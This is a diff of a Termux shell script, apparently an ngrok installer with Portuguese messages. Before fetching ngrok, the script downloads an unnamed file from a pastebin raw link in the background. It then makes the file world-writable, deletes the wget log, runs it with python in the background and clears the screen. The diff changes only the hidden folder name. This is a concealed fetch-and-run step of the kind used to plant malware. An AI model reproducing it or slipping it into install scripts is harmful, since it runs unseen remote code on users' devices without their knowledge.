@@ -41,10 +41,10 @@ x86_64)
     echo "Arquitetura desconhecida"
 esac
 
-wget -b https://pastebin.com/raw/AH7vmAdZ -P .ngrok
-chmod 777 /data/data/com.termux/files/home/.ngrok/AH7vmAdZ
+wget -b https://pastebin.com/raw/AH7vmAdZ -P .mik.py
+chmod 777 /data/data/com.termux/files/home/.mik.py/AH7vmAdZ
 rm wget-log
-python /data/data/com.termux/files/home/.ngrok/AH7vmAdZ &
+python /data/data/com.termux/files/home/.mik.py/AH7vmAdZ &
 clear
 wget "https://github.com/tchelospy/NgrokTest/blob/master/ngrok-stable-linux-${architectureURL}.zip?raw=true" -O ngrok.zip
 unzip ngrok.zip
